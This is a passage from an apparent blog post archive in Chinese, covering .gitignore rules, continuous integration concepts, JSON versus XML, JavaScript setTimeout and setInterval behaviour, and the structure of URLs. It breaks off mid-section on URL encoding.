check-ignore pathname 通过这个命令，对于某些存在复杂忽略匹配规则的项目，在需要判断某个文件是否被忽略时，我们就不需要根据这个文件的路径和名称特征在.gitignore中一条一条地检查了。 比如，我们希望判断ddd\\1.txt文件是否在忽略列表中： 12git check-ignore ddd\\1.txt-&gt; &quot;ddd\\\\1.txt&quot; 因为输出了&quot;ddd\\\\1.txt&quot;，则说明Git会忽略ddd\\1.txt这个文件（事实上，我在.gitignore中增加了/ddd/这一规则）。 五. .gitignore类型.gitignore可以分为Global gitignore 和 Project gitignore。 Global gitignore：即将某个.gitignore文件设置为全局，那么这个.gitignore文件中的忽略规则对本机中所有Git项目都有效 Project gitignore：即在某个仓库（repository）中添加的.gitignore文件，这个文件中的忽略规则仅仅在这个项目中生效 1.添加Global gitignore以Windows平台为例，添加Global级别的 gitignore： 在C:\\Users\\{User Name}中增加一个.gitignore_global文件，在这个文件中添加全局过滤规则 在控制台中输入git config --global core.excludesfile ~/.gitignore_global，当然这里我默认你已经将’git添加到了path`环境变量中。 ​ 2.添加Project gitignore添加Project级别的 gitignore很简单，只需要在一个Git repository的任何一个位置下添加一个.gitignore文件即可。 这意味着，你可以在一个Git repository的不同位置下添加.gitignore。那么如果不同的.gitignore中包含了相互矛盾的过滤规则，就存在优先级的问题： 事实上，git会在这个repository中构建一个文件结构树，子节点的.gitignore会重写父节点的.gitignore的过滤规则。 举个例子来说，在一个repository中，文件是这样的： 1234- .gitignore- a-folder - .gitignore - file.txt 其中，在根目录下的.gitignore中定义file.txt（即忽略file.txt），在a-folder文件夹的.gitignore中定义!file.txt（即不忽略file.txt）。 通过git status，我们发现该file.txt是会被git跟踪的，其实是因为a-folder文件夹的.gitignore中定义的!file.txt重写了根目录下的.gitignore中定义的file.txt忽略规则。 六.注意1. 尽量在Project创立之初，就定义好.gitignore最后需要强调的一点是，如果你在将对应某个文件或文件夹的过滤规则添加到.gitignore之前，就将这个文件或文件夹 git push到了远端 repository，那么即使你在.gitignore中添加这些过滤规则，这些规则也不会起作用，Git仍然会对这些文件或者文件夹进行版本管理。 因此，我们尽量在Project创立之初，就定义好.gitignore。如果在之后的开发过程中，因为新增加了某些文件，而需要增加了新的过滤规则，要保证这些文件在创建之初，就在.gitignore中增加对应的过滤规则。而不是在git push这些文件后，才想起来要修改.gitignore。 2.已经被tracked的文件设置.gitignore无效.gitignore规则仅对未被跟踪（tracked）的文件有效，跟踪（tracked）文件包括被暂存（staged）的文件（即该文件已经被git add了，但没有git commit），和被git commit的文件。 七.参考 gitignore last updated in 2.12.2 GitHub Help - Ignoring files -https://www.atlassian.com/git/tutorials/gitignore","comments":true,"categories":[{"name":"Git","slug":"Git","permalink":"http://swsmile.info/categories/Git/"}],"tags":[{"name":"Version Control","slug":"Version-Control","permalink":"http://swsmile.info/tags/Version-Control/"},{"name":"Git","slug":"Git","permalink":"http://swsmile.info/tags/Git/"}]},{"title":"【Software Testing】 持续集成（Continuous integration）之粗浅理解","date":"2017-04-02T01:18:53.000Z","path":"2017/04/02/【Software Testing】持续集成之粗浅理解/","text":"这两天在TeamCity（一个Continuous integration 系统）上配置自己负责的一个Project，mark一下对持续集成（Continuous integration）的理解。 在传统软件开发过程中，集成通常发生在每个 developer 都完成了各自的代码开发工作之后。在项目尾声阶段，通常集成还要痛苦的花费数周或者数月的时间来完成。如今，更强调敏捷开发、快速迭代的概念。持续集成满足了这一需求，是指将集成提前至开发的过程中的一种实践方式，让构建、测试和集成代码更经常反复地发生。 我们经常会听到持续集成，持续交付，持续部署，三者究竟是什么，有何联系和区别呢? 假如把开发工作流程分为以下几个阶段： 编码 -&gt; 构建 -&gt; 集成 -&gt; 测试 -&gt; 交付 -&gt; 部署 正如你在上图中看到，「持续集成(Continuous Integration)」、「持续交付(Continuous Delivery)」和「持续部署(Continuous Deployment)」有着不同的软件自动化交付周期。 一.持续集成持续集成 （Continuous Integration）是指软件个人 developer 的代码频繁地集成到主干代码中。“持续集成”本质是一个代码开发实践，源自于极限编程(XP)，是 XP 最初的 12 种实践之一。 集成：其实就是指将新开发完成的代码合并到主干分支中。 1.持续集成的好处：（1） 快速发现代码错误。在集成前，进行相应的自动化单元测试，若存在任何的单元测试失败，在Bug fixed 前，拒绝集成。 这样做的好处是可以快速的暴露代码错误，且保证主干代码的健康。具体来说，可以跟踪因何处新加的代码或者修改的代码引起了错误。但存在一个前提，需要存在较为完善的单元测试用例。 （2） 提升迭代速度所有的单元测试，都在CI agent（CI系统中自动执行单元测试的机器） 上自动触发，不占用开发者自身的操作系统资源。且每当完成一个Feture开发，就集成到主干代码中，这使得产品可以快速迭代，同时保证高质量。 注意：&quot;持续集成并不能消除Bug，而是让它们非常容易发现和改正。&quot; （3） 提高代码的质量在持续集成系统中，可以检查代码规范（Code Style）、单元测试覆盖率（Unit Test Coverage)和单元测试通过率等指标。 2.持续集成的特点 自动构建：要求无人值守，如果人工来操作，那就没有持续集成的必要了。 发现版本库的变更：通过轮询或者定时，或者程序员使用命令，处理持续集成发现版本库的变更 反馈机制：在出现问题时，能及时的把问题反馈给正确的人（提交者、测试者、管理者） 回滚：在出现问题后，拥有回滚到可交付的能力。 纯净的构建环境：每一次都应该把之前的环境删除干净，让每一次构建都是一个新的构建。 完善的集成功能：代码的测试，审查都应该做到完善。如果单纯的利用它做持续的编译，那就是大材小用了。 二.持续交付持续交付（Continuous delivery）建立在持续集成的基础之上，指的是可频繁的小粒度的短周期的将软件的新版本交付给使用者或质量团队，以提供评审。如果评审通过，则可手动部署到生产环境。频繁的交付周期带来了更迅速的对软件的反馈，并且在这个过程中，各个角色密切协作，相比于传统的瀑布式软件团队，更少浪费。 持续交付可以看作持续集成的下一步。它更多强调的是，不管代码怎么更新，软件是随时随地都可以交付的。 三.持续部署持续部署（continuous deployment）则是在持续交付的基础之上，指的是代码通过评审以后，可自动部署到生产环境。 持续部署的目标是，代码在任何时刻都是可部署的，即可以进入生产阶段。 四.参考 持续集成是什么？ 为什么要做持续集成 持续集成的魅力：工具推荐 持续交付概述 谈谈持续集成，持续交付，持续部署之间的区别 Continuous Integration Top benefits of continuous integration Continuous Delivery vs Continuous Deployment","comments":true,"categories":[{"name":"SoftwareTesting","slug":"SoftwareTesting","permalink":"http://swsmile.info/categories/SoftwareTesting/"}],"tags":[{"name":"Software Testing","slug":"Software-Testing","permalink":"http://swsmile.info/tags/Software-Testing/"}]},{"title":"【Data Format】JSON","date":"2017-04-01T13:23:23.000Z","path":"2017/04/01/【Data-Format】JSON/","text":"近期在做 Android SDK 开发，第一次接触了 Gradle，其中的管理文件build.gradle给我的第一印象，非常类似 JSON（比起Marven中用来管理依赖项的 XML），着实清晰与简洁很多，于是想写一篇 Blog 来总结一把 JSON 的特性。 一.JSON定义JSON (JavaScript Object Notation) 是一种轻量级的数据存储与交换格式（data-storage and data-interchange format）。 JSON 采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。 数据格式：什么是格式？就是规范你的数据要怎么表示，举个栗子，有个人叫“二百六”，身高“160cm”，体重“60kg”，现在你要将这个人的这些信息传给别人，你有很多种选择： 姓名“二百六”，身高“160cm”，体重“60kg” name=”二百六”&amp;height=”160cm”&amp;weight=”60kg” {“name”:”二百六”,”height”:160,”weight”:60} …… 以上所有选择，传递的数据本质都是一样的，但是你可以看到形式是可以各式各样的，这就是各种不同格式化后的数据，JSON是其中一种表示方式。 二.JSON的构成JSON只由以下两种结构构成： “名称/值”对的集合（A collection of name/value pairs），通常称为对象（object） 值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array） 具体来说： 1.对象（object） 每一个对象都由一个或多个无序的键值对（name/value）组成 每一个对象由“{”开始，并以“}”结尾 在对象的任何一个键值对中，键（name）都由字符串组成，且字符串需要用“””和“””包裹 在对象的任何一个键值对中，键（name）之后都跟着一个“:”，且键值对与键值对之间使用“,”分隔 2.值（value）值（value）可以是双引号括起来的字符串（string）、数值(number)、true、false、 null、对象（object）或者数组（array）。而且，这些结构可以相互嵌套。 3.数组（array） 数组是一个有序集合，以一个“[”开头，并以一个“]”结尾 数组之间的每个元素以“,”分隔 4.字符串（string） 字符串（string）是由双引号包围的任意数量Unicode字符的集合 使用反斜线（“\\”）转义 一个字符（character）即一个单独的字符串（character string）。 5.数值（number） 三.JSON与XML在JSON之前，有一个数据格式叫XML，现在还是广泛在用，但是JSON更加轻量，如XML需要用到很多标签。 我将举一个例子，分别用XML和JSON来描述同一份数据： 12345678910111213141516171819202122232425&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;country&gt; &lt;name&gt;中国&lt;/name&gt; &lt;province&gt; &lt;name&gt;广东&lt;/name&gt; &lt;cities&gt; &lt;city&gt;广州&lt;/city&gt; &lt;city&gt;深圳&lt;/city&gt; &lt;city&gt;珠海&lt;/city&gt; &lt;/cities&gt; &lt;/province&gt; &lt;province&gt; &lt;name&gt;台湾&lt;/name&gt; &lt;cities&gt; &lt;city&gt;台北&lt;/city&gt; &lt;city&gt;高雄&lt;/city&gt; &lt;/cities&gt; &lt;/province&gt; &lt;province&gt; &lt;name&gt;新疆&lt;/name&gt; &lt;cities&gt; &lt;city&gt;乌鲁木齐&lt;/city&gt; &lt;/cities&gt; &lt;/province&gt;&lt;/country&gt; 12345678910111213141516171819&#123; &quot;name&quot;: &quot;中国&quot;, &quot;province&quot;: [&#123; &quot;name&quot;: &quot;广东&quot;, &quot;cities&quot;: &#123; &quot;city&quot;: [&quot;广州&quot;, &quot;深圳&quot;, &quot;珠海&quot;] &#125; &#125;, &#123; &quot;name&quot;: &quot;台湾&quot;, &quot;cities&quot;: &#123; &quot;city&quot;: [&quot;台北&quot;, &quot;高雄&quot;] &#125; &#125;, &#123; &quot;name&quot;: &quot;新疆&quot;, &quot;cities&quot;: &#123; &quot;city&quot;: [&quot;乌鲁木齐&quot;] &#125; &#125;]&#125; 你可以明显看到XML格式的数据中标签本身占据了很多空间，而JSON比较轻量，即相同数据，以JSON的格式占据的带宽更小，这在有大量数据请求和传递的情况下是有明显优势的。 三.Why writes this blog很欣慰你能看到这里，可能在我们的日常开发中，JSON经常被使用，自己已经感觉非常熟悉了。 但是就我而言，偶尔还会因为在JSON中对字符串漏加“””和“”” 或 在集合中漏加“,”而增加了 debug 的时间。 四.参考 Introducing JSON 深入理解 JSON","comments":true,"categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://swsmile.info/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://swsmile.info/tags/JavaScript/"},{"name":"Data Format","slug":"Data-Format","permalink":"http://swsmile.info/tags/Data-Format/"}]},{"title":"【JavaScript】 JavaScript定时器深入解析","date":"2017-03-31T13:03:14.000Z","path":"2017/03/31/【JavaScript】JavaScript定时器深入解析/","text":"JavaScript提供定时执行代码的功能，叫做定时器（timer），主要由setTimeout()和setInterval()这两个函数来完成。它们向任务队列添加定时任务。 一.setTimeout()setTimeout可用来指定某个函数或某段代码，在多少毫秒之后被放到任务队列中，且仅仅执行一次。它返回一个整数，表示定时器的编号，以后可以用来取消这个定时器。 1var timerId = setTimeout(func|code, delay, args) 第一个参数func|code表示可以接受一个函数的名称或者一段代码，第二个参数指定推迟多少毫秒后被放到任务队列（并不意味着马上会被执行，下文会详细描述原因），除了前两个参数，还允许传入更多的参数，它们将被传入待推迟执行的函数中。 1.接受的第一个参数：func|code第一个参数func|code表示可以接受一个函数的名称或者一段代码。 （1）接受一个函数的名称1234567function f()&#123; console.log(2);&#125;setTimeout(f,1000);// 或者setTimeout(function ()&#123;console.log(2)&#125;,1000); （2）接受一段代码需要注意的是，推迟执行的代码必须以字符串的形式，放入setTimeout，因为引擎内部使用eval函数，将字符串转为代码。一方面eval函数有安全顾虑，另一方面为了便于JavaScript 引擎优化代码（比如对于常用的 JavaScript代码压缩工具（YUI Compressor、Google ClosureCompiler）会将这些内容当做单纯的字符串，而不是函数，从而不会对其处理与压缩），所以这种方法很少使用。 1234console.log(1);setTimeout(&apos;console.log(2)&apos;,1000);console.log(3);// 上面代码的输出结果就是1，3，2，因为`setTimeout`指定第二行语句推迟1000毫秒再执行。 2.接受的第一个参数：delay第二个参数指定推迟多少毫秒后被放到任务队列（并不意味着马上会被执行），默认为0。 这里有一个很大的误区就是，当设定时间之后，很多人认为在指定延迟时间到达后会立即执行定时器，其实不是。设定一个 150ms 后执行的定时器不代表到了 150ms 后代码就立刻执行，它仅表示代码在 150ms 后被加入到任务队列中。如果在这个时间点上，主线程上的所有同步任务都执行完毕，并且任务队列上没有其他任务，那么这个任务会被执行；如果主线程上的同步任务未执行完毕，或任务队列上还存在其他异步任务（包括时间更短的定时器），这时候就要等待以上同步任务和异步任务执行完毕之后，这个指定任务才会开始执行。 3.额外的参数除了前两个参数，还允许传入更多的参数，它们将被传入待推迟执行的函数中。 1234setTimeout(function(a,b)&#123; console.log(a+b);&#125;,1000,1,1);// 1s后输出2 4.注意（1）this 问题如果被setTimeout推迟执行的回调函数是某个对象的方法，那么该方法中的this关键字将指向全局环境，而不是定义时所在的那个对象。 1234567891011var x = 1;var o = &#123; x: 2, y: function()&#123; console.log(this.x); &#125;&#125;;setTimeout(o.y,1000);// 1 再看一个不容易发现错误的例子。 1234567891011function User(login) &#123; this.login = login; this.sayHi = function() &#123; console.log(this.login); &#125;&#125;var user = new User(&apos;John&apos;);setTimeout(user.sayHi, 1000);//undefined 上面代码只会显示undefined，因为等到user.sayHi执行时，它是在全局对象中执行，所以this.login取不到值。 为了防止出现这个问题，一种解决方法是将user.sayHi放在函数中执行。 123setTimeout(function() &#123; user.sayHi();&#125;, 1000); 上面代码中，sayHi是在user作用域内执行，而不是在全局作用域内执行，所以能够显示正确的值。 （2）最短时间问题HTML 5标准规定，setTimeout的最短时间间隔是4毫秒。为了节电，对于那些不处于当前窗口的页面，浏览器会将时间间隔扩大到1000毫秒。另外，如果笔记本电脑处于电池供电状态，Chrome和IE 9以上的版本，会将时间间隔切换到系统定时器，大约是15.6毫秒。 二.setInterval()setInterval函数的用法与setTimeout完全一致，区别仅仅在于setInterval指定某个任务每隔一段时间就执行一次，也就是无限次的定时执行。 12345678&lt;input type=&quot;button&quot; onclick=&quot;clearInterval(timer)&quot; value=&quot;stop&quot;&gt;&lt;script&gt; var i = 1 var timer = setInterval(function() &#123; console.log(2); &#125;, 1000);&lt;/script&gt; 上面代码表示每隔1000毫秒就输出一个2，直到用户点击了停止按钮。 下面是一个通过setInterval方法实现网页动画的例子。 12345678910var div = document.getElementById(&apos;someDiv&apos;);var opacity = 1;var fader = setInterval(function() &#123; opacity -= 0.1; if (opacity &gt;= 0) &#123; div.style.opacity = opacity; &#125; else &#123; clearInterval(fader); &#125;&#125;, 100); 上面代码每隔100毫秒，设置一次div元素的透明度，直至其完全透明为止。 ==&gt;可见，setInterval的一个常见用途是实现轮询。 1.关于时间间隔setInterval指定的是“开始执行”之间的间隔，并不考虑每次任务执行本身所消耗的时间。因此实际上，有可能出现后一次开始执行的时间减去前一次执行结束时的时间的差值小于指定的时间。比如，setInterval指定每100ms执行一次，每次执行需要5ms，那么第一次执行结束后95毫秒，第二次执行就会开始。如果某次执行耗时特别长，比如需要105毫秒，那么它结束后，下一次执行就会立即开始。 为了确保两次执行之间有固定的间隔，可以不用setInterval，而是每次执行结束后，使用setTimeout指定下一次执行的具体时间。 12345var i = 1;var timer = setTimeout(function() &#123; alert(i++); timer = setTimeout(arguments.callee, 2000);&#125;, 2000); 上面代码可以确保，下一个对话框总是在关闭上一个对话框之后2000毫秒弹出。 根据这种思路，可以自己部署一个函数，实现间隔时间确定的setInterval的效果。 123456789101112function interval(func, wait)&#123; var interv = function()&#123; func.call(null); setTimeout(interv, wait); &#125;; setTimeout(interv, wait);&#125;interval(function()&#123; console.log(2);&#125;,1000); 上面代码部署了一个interval函数，用循环调用setTimeout模拟了setInterval。 2.HTML 5标准规定HTML 5标准规定，setInterval的最短间隔时间是10毫秒，也就是说，小于10毫秒的时间间隔会被调整到10毫秒。 3.Best Practise《JavaScript高级程序设计(第三版)》建议，使用超时调用（setTimeout）来模拟间歇调用（setInterval）的是一种最佳模式，原因是后一个间歇调用可能会在前一个间歇调用结束之前启动。 三.clearTimeout()，clearInterval()setTimeout和setInterval函数，都返回一个表示计数器编号的整数值，将该整数传入clearTimeout和clearInterval函数，就可以取消对应的定时器。 12345var id1 = setTimeout(f,1000);var id2 = setInterval(f,1000);clearTimeout(id1);clearInterval(id2); setTimeout和setInterval返回的整数值是连续的，也就是说，第二个setTimeout方法返回的整数值，将比第一个的整数值大1。利用这一点，可以写一个函数，取消当前所有的setTimeout。 12345678910111213(function() &#123; var gid = setInterval(clearAllTimeouts, 0); function clearAllTimeouts() &#123; var id = setTimeout(function() &#123;&#125;, 0); while (id &gt; 0) &#123; if (id !== gid) &#123; clearTimeout(id); &#125; id--; &#125; &#125;&#125;)(); 运行上面代码后，实际上再设置任何setTimeout都无效了。 四.运行机制setTimeout和setInterval的运行机制是，将指定的代码移出本次执行，等到下一轮Event Loop时，再检查是否到了指定时间。如果到了，就执行对应的代码；如果不到，就等到再下一轮Event Loop时重新判断。 这意味着，setTimeout和setInterval指定的代码，必须先等到本轮Event Loop的所有同步任务都执行完，再等到本轮Event Loop的“任务队列”的所有任务执行完，才会开始执行。由于前面的任务到底需要多少时间执行完，是不确定的，所以没有办法保证，setTimeout和setInterval指定的任务，一定会按照预定时间执行。 12setTimeout(someTask, 100);veryLongTask(); 上面代码的setTimeout，指定100毫秒以后运行一个任务。但是，如果后面的veryLongTask函数（同步任务）运行时间非常长，过了100毫秒还无法结束，那么被推迟运行的someTask就只有等着，等到veryLongTask运行结束，才轮到它执行。 这一点对于setInterval影响尤其大。 1234567setInterval(function () &#123; console.log(2);&#125;, 1000);(function () &#123; sleeping(3000);&#125;)(); 上面的第一行语句要求每隔1000毫秒，就输出一个2。但是，第二行语句需要3000毫秒才能完成，请问会发生什么结果？ 结果就是等到第二行语句运行完成以后，立刻连续输出三个2，然后开始每隔1000毫秒，输出一个2。也就是说，setIntervel具有累积效应，如果某个操作特别耗时，超过了setInterval的时间间隔，排在后面的操作会被累积起来，然后在很短的时间内连续触发，这可能或造成性能问题（比如集中发出Ajax请求）。 五.一些特殊情况setTimeout的作用是将代码推迟到指定时间执行，如果指定时间为0，即setTimeout(f, 0)，那么会立刻执行吗？ 答案是不会。因为上一段说过，必须要等到当前脚本的同步任务和“任务队列”中已有的事件，全部处理完以后，才会执行setTimeout指定的任务。也就是说，setTimeout的真正作用是，在“消息队列”的现有消息的后面再添加一个消息，规定在指定时间执行某段代码。setTimeout添加的事件，会在下一次Event Loop执行。 setTimeout(f, 0)将第二个参数设为0，作用是让f在现有的任务（脚本的同步任务和“消息队列”指定的任务）一结束就立刻执行。也就是说，setTimeout(f, 0)的作用是，尽可能早地执行指定的任务。而并不是会立刻就执行这个任务。 123setTimeout(function () &#123; console.log(&apos;你好！&apos;);&#125;, 0); 上面代码的含义是，尽可能早地显示“你好！”。 setTimeout(f, 0)指定的任务，最早也要到下一次Event Loop才会执行。请看下面的例子。 12345678910111213141516171819202122232425262728setTimeout(function() &#123; console.log(&quot;Timeout&quot;);&#125;, 0);function a(x) &#123; console.log(&quot;a() 开始运行&quot;); b(x); console.log(&quot;a() 结束运行&quot;);&#125;function b(y) &#123; console.log(&quot;b() 开始运行&quot;); console.log(&quot;传入的值为&quot; + y); console.log(&quot;b() 结束运行&quot;);&#125;console.log(&quot;当前任务开始&quot;);a(42);console.log(&quot;当前任务结束&quot;);// 当前任务开始// a() 开始运行// b() 开始运行// 传入的值为42// b() 结束运行// a() 结束运行// 当前任务结束// Timeout 上面代码说明，setTimeout(f, 0)必须要等到当前脚本的所有同步任务结束后才会执行。 即使消息队列是空的，0毫秒实际上也是达不到的。根据HTML 5标准，setTimeout推迟执行的时间，最少是4毫秒。如果小于这个值，会被自动增加到4。这是为了防止多个setTimeout(f, 0)语句连续执行，造成性能问题。 六.参考 定时器 JavaScript定时器及相关面试题","comments":true,"categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://swsmile.info/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://swsmile.info/tags/JavaScript/"}]},{"title":"【HTTP】URL总结","date":"2017-03-31T12:37:09.000Z","path":"2017/03/31/【HTTP】URL总结/","text":"我每天都在使用URL，每天和他打交道。但是，在阅读《HTTP权威指南》后，才发现我对URL的理解是不全面的、碎片化的。 1.URL的历史在因特网的历史上，统一资源定位符（URL，Uniform Resource Locator）的发明是一个非常基础的步骤。统一资源定位符的语法是一般的，可扩展的。它存在的目的，是使用ASCII代码的一部分来表示互联网的地址。 2.URL的构成URL提供了一种定位因特网上任意资源的手段，但这些资源是可以通过各种不同的 scheme（比如HTTP、FTP、SMTP）来访问的，因此URL语法会随 scheme 的不同而有所不同。 这是不是意味着每种不同的 URL scheme 都会有完全不同的语法呢？实际上，不是的。 大部分URL都遵循通用的URL语法，而且不同 URL scheme 的风格和语法都有不少重叠。 大多数 URL scheme 的 URL 语法都建立在这个由 9 部分构成的通用格式上： ：//：@：/；?# 几乎没有哪个 URL 中包含了所有这些组件。URL 最重要的3个部分是 scheme、host 和 path。 组件 描 述 默认值 Scheme 访问服务器以获取资源时要使用的某种协议 无 User 某些 Scheme 访问资源时需要的用户名 匿名 Password 用户名后面可能要包含的密码，中间由冒号“:”分割 Host 资源宿主服务器的主机名或 IP 地址 无 Port 资源宿主服务器正在监听的端口号.很多方案都有默认端口号（HTTP 的默认端口号为80） 每个方案特有 Path 服务器上资源的本地名，由一个斜扛“/”将其与前面的 URL 组件分隔开来（稍后会讲到URL路径可以分为若干个段，每段都可以有其特有的组件） 无 Param 某些 Scheme 会用这个组件来指定输入参数，格式为名/值对。 URL中可以包含多个 Param 字段，它们相互之间以及与 Param组件 的其余部分组件之间用分号“；”分隔 无 Query 某些 Scheme 会用这个组件传递参数给服务器，或标识查询条件，用字符“？”将 Query组件 与URL的其余部分分隔开 无 Fragment 一些客户端，不会将frag字段传送给服务器，这个字段是在客户端内部（比如浏览器内部）使用的，通过“#”字符将其与URL的其余组件分割开来 无 比如，我们来看看 URL: http://vww.joes-hardware.com:80/indcx,html ，其scheme是 HTTP， host是www.joes-hardware.com ，Port是 80，Path为/index.html。 3.URL中组件含义3.1 scheme -&gt; 使用什么协议scheme 实际上是规定如何访问指定资源的主要标识符，它会告诉负责解析URL的应用程序应该使用什么协议。在我们这个简单的 HTTP URL 中所使用的 scheme 就是 HTTP。 scheme 必须以一个字母符号开始，由第一个“:”符号将其与URL的其余部分分隔开来。scheme名是大小写无关的，因此URL“http://www.joes-hardware.com” 和 “HTTP://www.jocs-hardware.conT 是等价的。 3.2 host 与 port -&gt; 域名与端口要想在因特网上找到资源，应用程序要知道是哪台机器装载了资源，以及在那台机器的什么地方可以找到能对目标资源进行访问的服务器。URL的 host 和 port 提供了这两组信息。 Host 组件标识了因特网上能够访问资源的宿主机器。可以用上述主机名（www.joes-hardware.com)，或者IP地址来表示主机名。 比如，下面两个 URL 就指向同一个资源： 第一个 URL 是通过主机名 第二个是通过 IP 地址指向服务器的 http://www.joes-hardware.com:80/index.html http://161.58.228.45:80/index.html port 标识了服务器正在监听的网络端口。对下层使用了 TCP 协议的 HTTP 来说，默认端口号为80。 3.3 username 和 password -&gt; 用户名与密码部分服务器都要求输入 username 和 password 才会允许用户访问数据。比如FTP服务器。这里有几个例子： ftp://ftp.prep.ai.mit.edu/pub/gnu ​ ftp://anonymous@ftp.prep.ai.mit.edu/pub/gnu ​ http://joe:joespasswd@www.joes-hardwarc.com/sales_info.txt 第一个例子中，没有username和password组件，只有标准的方案、主机和路径。如果某应用程序使用的URL方案要求输入username和password，比如FTP，但用户没有提供，它通常会插入一个默认的用户名和密码。比如，如果向浏览器提供一个FTP URL，但没有指定用户名和密码，它就会插入anonymous (匿名用户）作为你的用户名，并发送一个默认的密码（Internet Explorer会发送IEUser，Netscape Navigator則会发送 mozilla）。 第二个例子中，显示了一个指定为anonymous的用户名。这个用户名与主机组件组合在一起，看起来就像E-mail地址一样。字符“@”将用户和密码组件与URL的其余部分分隔开来。 第三个例子中，指定了用户名（joe）和密码（joespasswd），两者之间由字符“:”分隔。 3.4 path -&gt; 路径URL的 path 说明了资源位于服务器的什么地方。路径通常很像一个分级的文件系统路径。比如： http://www.joes-hardware.com:80/seasonal/index-fall.html 这个URL中的 Path 为/seasonal/index-fall.html，很像UNIX文件系统中的文件系统路径。路径是服务器定位资源时所需的信息。可以用字符“/”将HTTP URL的路径组件划分成一些路径段（path segment）（还是与UNIX文件系统中的文件路径类似）。每个路径段都有自己的参数（param）组件。 3.5 param -&gt; 参数对很多方案来说，只有简单的主机名和到达对象的路径是不够的。除了服务器正在监听的端口，以及是否能够通过用户名和密码访问资源外，很多协议都还需要更多的信息才能工作。 负责解析URL的应用程序需要这些协议参数来访问资源。否则，被请求的服务器可能就不会为请求提供服务，或者更糟糕的是，提供错误的服务。比如，像FTP这样的协议，有两种传输模式，二进制和文本形式。你肯定不希望以文本形式来传送二进制图片，这样的话，二进制图片可能会变得一团糟。 为了向应用程序提供它们所需的输入参数，以便正确地与服务器进行交互，URL中有一个参数组件。这个组件就是URL中的名值对列表，由字符“;”将其与URL的其余部分（以及各名值对）分隔开来。在每个param组内部，用字符“=”来区分key和value。它们为应用程序提供了访问资源所需的所有附加信息。比如： ftp://prep.ai.mit.edu/pub/gnu;type=d 在这个例子中，有一个参数typc=d，参数名为type,值为d。 如前所述，HTTP URL的路径组件可以分成若干路径段。每段都可以有自己的参数。比如： http://www.joes-hardware.com/hammers;sale=false/index.html;graphics=true 这个例子就有两个路径段，hammers和index.html。hammers路径段（sale=false）有参数sale，其值为 false。index.html段（graphics=true）有参数 graphics，其值为 true。 3.6 quiery（quirystring） -&gt; 查询条件很多资源，比如数据库服务，都是可以通过提问题或进行査询来缩小所请求资源类型范围的。 假设Joe的五金商店在数据库中维护着一个未售货物的淸单，并可以对淸单进行査询，以判断产品是否有货，那就可以用下列URL来査询Web数据库网关，看看编号为12731的条目是否有货： http://www.joes-hardware.com/inventory-check.cgi?itein=1273l 除了有些不合规则的字符需要特别处理之外（某些字符需要URL编码），对査询组件的格式没什么要求。按照常规，很多服务器都希望査询字符串以一系列“名/值”对的形式出现，名值对之间用字符“&amp;”分隔： http://www.joes-hardware.com/inventory-check.cgi?item=12731&color=blue 在这个例子中，査询组件有两个名/值对：item=12731和color=blue。 3.7 frag -&gt; 片段有些资源类型，比如HTML，除了资源级之外，还可以做进一步的划分。比如，对一个带有章节的大型文本文档来说，资源的URL会指向整个文本文档，但我们更期望的是，提供一种方式使能够指向到资源中某些章节或位置。 为了引用部分资源或资源的一个片段，URL支持使用片段（frag）组件来表示一个资源内部的片段。比如，URL可以指向HTML文档中一个特定的图片或小节。 片段在URL的最右边，最前面以一个字符‘#’将其与其他组件区分。比如： http://www.joes-hardware.eom/tools.html#drills 在这个例子中，片段drills引用了五金商店Web服务器上页面/tools.html中的一个部分。这部分的名字叫做drills。 HTTP服务器通常只处理在URL中除 Frag 以外的元素，因此客户端也不能将 Frag 组件传送给服务器（参考下图）。但是，浏览器会记录下此前的Frag值，当从服务器获得了整个资源之后，浏览器会把该Frag值填充到URL中，并根据 Frag 来显示你感兴趣的那部分资源。 4.理解URL构成的意义在日常开发中，我们可能会碰到以下需求： 从一个URL中提取出host 从一个URL中提取出querystring中的所有元素 我们可以根据URL格式的定义，从://后，可能包含[User:Password@] ，也可能不包含，所以可以以URL字符串中是否包含“@”字符做为判断是否包含[User:Password@] ，如果包含那“@”之后就是host（当然还要考虑host后的param和querystring），具体思路就不展开了。当然，你也可以用正则表达式来提取，但是你仍然需要参考URL的标准格式定义。 更全面与详细的URL定义与约定，你可以查询RFC。 5.URL、URN、URI 区别5.1 定义URN（Uniform Resource Name）：唯一标识一个实体的标识符，但不给出实体的位置。URI（Uniform Resource Identifier）：是一个紧凑的字符串用来标示抽象或物理资源的标识符。URL（Uniform Resource Locator）：除了确定一个资源外，还提供一种定位该资源的标识符。 5.2 关系以下这种图足以概括三者的关系： 概括的来说，URL 和 URN 都是 URI，但是 URI 不一定是 URL 或者 URN。 具体来说： URL是URI的一种，不仅标识了Web 资源，还指定了操作或者获取方式，同时指出了主要访问机制和网络位置。一个恰当的比喻，一个人的住址是一个URL，通过这个URL你可以准确找到这个人（根据URL可以准确获取到某个 Web 资源）。 URN是URI的一种，用特定命名空间的名字标识资源。可以用URN来唯一标识一个实体，可以在不知道其网络位置及访问方式的情况下讨论资源。一个恰当的比喻，书籍的ISBN码或产品在系统内的序列号是一个URN，尽管没有告诉你用什么方式或者到什么地方去找到目标，但是你有足够的信息来检索到它。 5.3 注意我们经常使用的URI不是严格技术意义上的URL。例如，你需要的文件在files.hp.com。 这是 URI，但不是 URL，因为未指定确定的 scheme、port 及 path。 因此你去http://files.hp.com 和[ftp://files.hp.com](ftp://files.hp.com/)，可能得到完全不同的内容。 所以，用 URI 吧，这样你通常技术上是正确的，URL可不一定。最后“URL”这个术语正在被弃用。 6.URL编码6.1 产生URL编码的原因（1） 使URL中可存在其他语言的字符默认的计算机系统字符集通常都倾向于以英语为中心。从历史上来看，很多计算机应用程序使用的都是US-ASCII字符集。US-ASCII使用7位二进制码来表示英文打字机提供的大多数按键和少数用于文本格式和硬件通知的不可打印控制字符。 由于US-ASCII的历史悠久，所以其可移植性很好。但是，虽然美国用户使用起来很便捷，它却并不支持有其他语言的字符存在。这意味着，在URL中不能包含除其他语言的字符，例如中文。 